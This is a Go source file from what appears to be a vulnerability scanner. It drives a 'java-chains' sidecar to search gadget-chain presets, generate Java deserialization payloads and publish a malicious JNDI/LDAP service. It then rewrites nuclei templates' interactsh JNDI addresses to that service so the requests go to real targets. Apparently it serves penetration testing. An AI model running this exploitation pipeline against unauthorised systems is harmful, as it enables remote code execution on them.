package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync/atomic"
	"time"

	"gopkg.in/yaml.v3"
)

// JavaChainsConfig is the optional java-chains sidecar wiring. The token is
// minted by deploy/java-chains-setup.sh; without it auto-invocation stays off.
type JavaChainsConfig struct {
	BaseURL      string
	Token        string
	BindHost     string
	CallbackHost string
}

// JavaChainsConfigFromEnv reads the same variables the MCP registration uses.
func JavaChainsConfigFromEnv() JavaChainsConfig {
	base := strings.TrimSpace(os.Getenv("JAVA_CHAINS_URL"))
	if base == "" {
		base = "http://java-chains:8011"
	}
	bind := strings.TrimSpace(os.Getenv("JAVA_CHAINS_CALLBACK_BIND"))
	if bind == "" {
		bind = "127.0.0.1"
	}
	callback := strings.TrimSpace(os.Getenv("JAVA_CHAINS_CALLBACK_HOST"))
	if callback == "" {
		callback = "127.0.0.1"
	}
	return JavaChainsConfig{
		BaseURL:      strings.TrimRight(base, "/"),
		Token:        strings.TrimSpace(os.Getenv("JAVA_CHAINS_MCP_TOKEN")),
		BindHost:     bind,
		CallbackHost: callback,
	}
}

// Configured reports whether a token is present.
func (c JavaChainsConfig) Configured() bool { return c.Token != "" }

// JavaChainsClient talks JSON-RPC to the sidecar's Streamable HTTP MCP.
type JavaChainsClient struct {
	cfg  JavaChainsConfig
	http *http.Client
	seq  atomic.Int64
}

// NewJavaChainsClient builds a client; timeout=0 uses 20s.
func NewJavaChainsClient(cfg JavaChainsConfig, timeout time.Duration) *JavaChainsClient {
	if timeout <= 0 {
		timeout = 20 * time.Second
	}
	return &JavaChainsClient{cfg: cfg, http: &http.Client{Timeout: timeout}}
}

type jcRPCResponse struct {
	JSONRPC string `json:"jsonrpc"`
	ID      int64  `json:"id"`
	Result  struct {
		Content []struct {
			Type string `json:"type"`
			Text string `json:"text"`
		} `json:"content"`
		// StructuredContent is complete; the text mirror is capped (e.g. 20 log
		// lines), so prefer the structured payload when the sidecar sends one.
		StructuredContent json.RawMessage `json:"structuredContent"`
		IsError           bool            `json:"isError"`
	} `json:"result"`
	Error *struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
	} `json:"error"`
}

func (c *JavaChainsClient) call(ctx context.Context, tool string, args any) (json.RawMessage, error) {
	if !c.cfg.Configured() {
		return nil, errors.New("JAVA_CHAINS_MCP_TOKEN 未配置")
	}
	if args == nil {
		args = map[string]any{}
	}
	payload, err := json.Marshal(map[string]any{
		"jsonrpc": "2.0",
		"id":      c.seq.Add(1),
		"method":  "tools/call",
		"params":  map[string]any{"name": tool, "arguments": args},
	})
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.cfg.BaseURL+"/api/mcp", bytes.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json, text/event-stream")
	req.Header.Set("X-Api-Token", c.cfg.Token)
	resp, err := c.http.Do(req)
	if err != nil {
		return nil, fmt.Errorf("java-chains 不可达: %w", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("java-chains HTTP %d: %s", resp.StatusCode, clipText(string(body), 200))
	}
	var rpc jcRPCResponse
	if err := json.Unmarshal(body, &rpc); err != nil {
		return nil, fmt.Errorf("解析 java-chains 响应失败: %w", err)
	}
	if rpc.Error != nil {
		return nil, fmt.Errorf("java-chains 错误 %d: %s", rpc.Error.Code, rpc.Error.Message)
	}
	if rpc.Result.IsError {
		text := ""
		if len(rpc.Result.Content) > 0 {
			text = rpc.Result.Content[0].Text
		}
		return nil, fmt.Errorf("java-chains 工具 %s 失败: %s", tool, clipText(text, 300))
	}
	if len(rpc.Result.StructuredContent) > 0 && string(rpc.Result.StructuredContent) != "null" {
		return rpc.Result.StructuredContent, nil
	}
	if len(rpc.Result.Content) == 0 {
		return nil, fmt.Errorf("java-chains 工具 %s 返回为空", tool)
	}
	return json.RawMessage(rpc.Result.Content[0].Text), nil
}

// JavaChainsStatus checks whether the sidecar answers with the current token.
func (c *JavaChainsClient) JavaChainsStatus(ctx context.Context) error {
	_, err := c.call(ctx, "java_chains_capabilities", map[string]any{})
	return err
}

// JavaChainsPreset is one search hit from java_chains_presets_search.
type JavaChainsPreset struct {
	ID                string   `json:"id"`
	Name              string   `json:"name"`
	Description       string   `json:"description"`
	Intent            string   `json:"intent"`
	Tags              []string `json:"tags"`
	Modes             []string `json:"modes"`
	PayloadCandidates []string `json:"payloadCandidates"`
	RequiredInputs    []struct {
		Key string `json:"key"`
	} `json:"requiredInputs"`
}

// SearchPresets looks up curated chains by keyword (fastjson, shiro, ...).
func (c *JavaChainsClient) SearchPresets(ctx context.Context, query string, limit int) ([]JavaChainsPreset, error) {
	if limit <= 0 {
		limit = 10
	}
	raw, err := c.call(ctx, "java_chains_presets_search", map[string]any{"query": query, "limit": limit})
	if err != nil {
		return nil, err
	}
	var out struct {
		Items []JavaChainsPreset `json:"items"`
	}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	return out.Items, nil
}

// JavaChainsJNDI is the publication returned by java_chains_quick_jndi.
type JavaChainsJNDI struct {
	TaskID        string `json:"taskId"`
	Status        string `json:"status"`
	Protocol      string `json:"protocol"`
	PublicationID string `json:"publicationId"`
	Formats       struct {
		LDAP     string `json:"ldap"`
		Protocol string `json:"protocol"`
		Token    string `json:"token"`
	} `json:"formats"`
	Service struct {
		State              string `json:"state"`
		ActivePublications struct {
			Count int `json:"count"`
		} `json:"activePublications"`
	} `json:"service"`
	Error *string `json:"error"`
}

// QuickJNDI validates a preset, generates the JNDI payload and starts the
// service in one call. It returns the advertised LDAP URL and job id.
func (c *JavaChainsClient) QuickJNDI(ctx context.Context, presetID, payload string, inputs map[string]any, bindHost, advertisedHost string) (*JavaChainsJNDI, error) {
	if payload == "" {
		payload = "JNDILDAPDeserializePayload"
	}
	if inputs == nil {
		inputs = map[string]any{}
	}
	args := map[string]any{
		"presetId":       presetID,
		"payload":        payload,
		"inputs":         inputs,
		"autoStart":      true,
		"bindHost":       bindHost,
		"advertisedHost": advertisedHost,
	}
	raw, err := c.call(ctx, "java_chains_quick_jndi", args)
	if err != nil {
		return nil, err
	}
	var out JavaChainsJNDI
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	if out.Error != nil && *out.Error != "" {
		return &out, errors.New(*out.Error)
	}
	if strings.TrimSpace(out.Formats.LDAP) == "" {
		return &out, errors.New("java-chains 未返回 LDAP 地址")
	}
	return &out, nil
}

// JavaChainsArtifact describes a generated payload.
type JavaChainsArtifact struct {
	ArtifactID string `json:"artifactId"`
	SizeBytes  int64  `json:"sizeBytes"`
	SHA256     string `json:"sha256"`
	Filename   string `json:"filename"`
}

// JavaChainsGenerate is the summary of java_chains_quick_generate.
type JavaChainsGenerate struct {
	Output struct {
		Artifact JavaChainsArtifact `json:"artifact"`
		Meta     struct {
			Payload      string `json:"payload"`
			Chain        string `json:"chain"`
			RawSizeBytes int64  `json:"rawSizeBytes"`
		} `json:"meta"`
	} `json:"output"`
}

// QuickGenerate builds a payload artifact without executing anything.
func (c *JavaChainsClient) QuickGenerate(ctx context.Context, presetID, payload string, inputs map[string]any) (*JavaChainsGenerate, error) {
	if inputs == nil {
		inputs = map[string]any{}
	}
	args := map[string]any{
		"presetId":     presetID,
		"inputs":       inputs,
		"responseMode": "summary",
	}
	if payload != "" {
		args["payload"] = payload
	}
	raw, err := c.call(ctx, "java_chains_quick_generate", args)
	if err != nil {
		return nil, err
	}
	var out JavaChainsGenerate
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	if out.Output.Artifact.ArtifactID == "" {
		return nil, errors.New("java-chains 未返回 artifact")
	}
	return &out, nil
}

// DeleteArtifact removes one generated payload.
func (c *JavaChainsClient) DeleteArtifact(ctx context.Context, artifactID string) error {
	if strings.TrimSpace(artifactID) == "" {
		return nil
	}
	_, err := c.call(ctx, "java_chains_artifact_delete", map[string]any{"artifactId": artifactID})
	return err
}

// JavaChainsLogEntry is one sidecar runtime log line.
type JavaChainsLogEntry struct {
	Seq       int64  `json:"seq"`
	Timestamp int64  `json:"timestamp"`
	Level     string `json:"level"`
	Message   string `json:"message"`
}

// RuntimeLogs reads recent sidecar log lines; callback hits are recorded there.
func (c *JavaChainsClient) RuntimeLogs(ctx context.Context, sinceSeq int64, limit int) ([]JavaChainsLogEntry, error) {
	if limit <= 0 {
		limit = 300
	}
	// The default minimal verbosity drops JNDI wire lines (baseToken/outcome).
	args := map[string]any{"limit": limit, "verbosity": "full"}
	if sinceSeq > 0 {
		args["sinceSeq"] = sinceSeq
	}
	raw, err := c.call(ctx, "java_chains_runtime_logs", args)
	if err != nil {
		return nil, err
	}
	var out struct {
		Entries []JavaChainsLogEntry `json:"entries"`
	}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	return out.Entries, nil
}

// DeleteJob removes a finished publication job and unpublishes its token.
func (c *JavaChainsClient) DeleteJob(ctx context.Context, taskID string) error {
	if strings.TrimSpace(taskID) == "" {
		return nil
	}
	_, err := c.call(ctx, "java_chains_jobs_delete", map[string]any{"taskId": taskID, "unpublish": true})
	return err
}

// ActiveJNDIPublications reports how many publications the JNDI service holds.
func (c *JavaChainsClient) ActiveJNDIPublications(ctx context.Context) (int, error) {
	raw, err := c.call(ctx, "java_chains_services_get", map[string]any{"service": "jndi"})
	if err != nil {
		return 0, err
	}
	var out struct {
		ActivePublications struct {
			Count int `json:"count"`
		} `json:"activePublications"`
	}
	if err := json.Unmarshal(raw, &out); err != nil {
		return 0, err
	}
	return out.ActivePublications.Count, nil
}

// StopJNDI shuts the JNDI service down.
func (c *JavaChainsClient) StopJNDI(ctx context.Context) error {
	_, err := c.call(ctx, "java_chains_services_stop", map[string]any{"service": "jndi"})
	return err
}

// ---------------------------------------------------------------- POC helpers

var javaChainFamilies = []string{
	"fastjson2", "fastjson", "shiro", "jackson", "xstream", "weblogic", "jboss",
	"websphere", "log4j2", "log4j",
}

// JavaDeserializationKeyword decides whether a POC is Java deserialization
// material and returns the preset search keyword (empty when not Java).
func JavaDeserializationKeyword(templateID, name string, tags []string, content string) string {
	lowerTags := make([]string, 0, len(tags))
	for _, t := range tags {
		lowerTags = append(lowerTags, strings.ToLower(strings.TrimSpace(t)))
	}
	joinedTags := strings.Join(lowerTags, ",")
	haystack := strings.ToLower(templateID + " " + name + " " + content)
	for _, fam := range javaChainFamilies {
		if strings.Contains(joinedTags, fam) || strings.Contains(strings.ToLower(templateID+" "+name), fam) {
			return fam
		}
	}
	deser := strings.Contains(joinedTags, "deserialization") ||
		strings.Contains(joinedTags, "deserialize") ||
		strings.Contains(joinedTags, "cwe-502") ||
		strings.Contains(haystack, "cwe-502")
	if !deser {
		return ""
	}
	javaHint := strings.Contains(joinedTags, "java") ||
		strings.Contains(haystack, "java.lang") ||
		strings.Contains(haystack, "java.io") ||
		strings.Contains(haystack, "com.sun.") ||
		strings.Contains(haystack, "jndi") ||
		strings.Contains(haystack, "commons-collections")
	if !javaHint {
		return ""
	}
	return "java deserialization"
}

// nucleiRawTemplate is the subset of a nuclei template needed for replay.
type nucleiRawTemplate struct {
	HTTP []struct {
		Raw []string `yaml:"raw"`
	} `yaml:"http"`
	Requests []struct {
		Raw []string `yaml:"raw"`
	} `yaml:"requests"`
}

// ExtractRawHTTPRequests returns the raw request blocks of a nuclei template.
func ExtractRawHTTPRequests(content string) []string {
	var tpl nucleiRawTemplate
	if err := yaml.Unmarshal([]byte(content), &tpl); err != nil {
		return nil
	}
	var out []string
	for _, h := range tpl.HTTP {
		for _, raw := range h.Raw {
			if r := strings.TrimSpace(raw); r != "" {
				out = append(out, r)
			}
		}
	}
	for _, h := range tpl.Requests {
		for _, raw := range h.Raw {
			if r := strings.TrimSpace(raw); r != "" {
				out = append(out, r)
			}
		}
	}
	return out
}

// RawTarget holds the target pieces substituted into nuclei raw requests.
type RawTarget struct {
	Scheme   string
	Host     string // host:port
	Hostname string // host only
	Port     string
	BaseURL  string
}

// ParseRawTarget splits an absolute target URL for template substitution.
func ParseRawTarget(raw string) (RawTarget, error) {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || u.Host == "" {
		return RawTarget{}, errors.New("目标地址无效")
	}
	out := RawTarget{Scheme: u.Scheme, Host: u.Host, Hostname: u.Hostname(), Port: u.Port(), BaseURL: u.Scheme + "://" + u.Host}
	if out.Scheme == "" {
		out.Scheme = "http"
	}
	if out.Port == "" {
		if out.Scheme == "https" {
			out.Port = "443"
		} else {
			out.Port = "80"
		}
	}
	return out, nil
}

var interactshJNDIURL = regexp.MustCompile(`(?i)\b(?:ldap|ldaps|rmi|rmis)://\{\{interactsh-url\}\}(?:[/?#][^\s"'<>]*)?`)

// HasInteractshJNDI reports whether a raw request carries a JNDI OAST address
// that can be swapped for a java-chains publication.
func HasInteractshJNDI(raws []string) bool {
	for _, raw := range raws {
		if interactshJNDIURL.MatchString(raw) {
			return true
		}
	}
	return false
}

// RewriteJNDIRequests substitutes the template's OAST JNDI address with the
// java-chains LDAP publication. It reports whether any request was rewritten.
func RewriteJNDIRequests(raws []string, ldapURL string, target RawTarget) ([]string, bool) {
	if strings.TrimSpace(ldapURL) == "" {
		return nil, false
	}
	var out []string
	rewritten := false
	for _, raw := range raws {
		if !interactshJNDIURL.MatchString(raw) {
			continue
		}
		raw = interactshJNDIURL.ReplaceAllString(raw, ldapURL)
		raw = strings.ReplaceAll(raw, "{{BaseURL}}", target.BaseURL)
		raw = strings.ReplaceAll(raw, "{{RootURL}}", target.BaseURL)
		raw = strings.ReplaceAll(raw, "{{Hostname}}", target.Host)
		raw = strings.ReplaceAll(raw, "{{Host}}", target.Hostname)
		raw = strings.ReplaceAll(raw, "{{Port}}", target.Port)
		raw = strings.ReplaceAll(raw, "{{Scheme}}", target.Scheme)
		out = append(out, raw)
		rewritten = true
	}
	return out, rewritten
}

// BuildRawRequest turns one raw HTTP block into a DeepRequest.
func BuildRawRequest(raw string, target RawTarget) (DeepRequest, error) {
	raw = strings.ReplaceAll(raw, "\r\n", "\n")
	head, body, _ := strings.Cut(raw, "\n\n")
	lines := strings.Split(head, "\n")
	if len(lines) == 0 {
		return DeepRequest{}, errors.New("空请求")
	}
	parts := strings.Fields(strings.TrimSpace(lines[0]))
	if len(parts) < 2 {
		return DeepRequest{}, errors.New("请求行不完整")
	}
	req := DeepRequest{Method: strings.ToUpper(parts[0]), Body: strings.TrimSuffix(body, "\n")}
	path := parts[1]
	switch {
	case strings.HasPrefix(path, "http://"), strings.HasPrefix(path, "https://"):
		req.URL = path
	case strings.HasPrefix(path, "/"):
		req.URL = target.BaseURL + path
	default:
		req.URL = target.BaseURL + "/" + path
	}
	for _, line := range lines[1:] {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		i := strings.Index(line, ":")
		if i <= 0 {
			continue
		}
		name := strings.TrimSpace(line[:i])
		value := strings.TrimSpace(line[i+1:])
		if name == "" || strings.EqualFold(name, "Host") || strings.EqualFold(name, "Content-Length") {
			continue
		}
		if req.Headers == nil {
			req.Headers = map[string]string{}
		}
		req.Headers[name] = value
	}
	return req, nil
}

func clipText(s string, limit int) string {
	if limit <= 0 || len(s) <= limit {
		return s
	}
	return s[:limit] + "…"
}
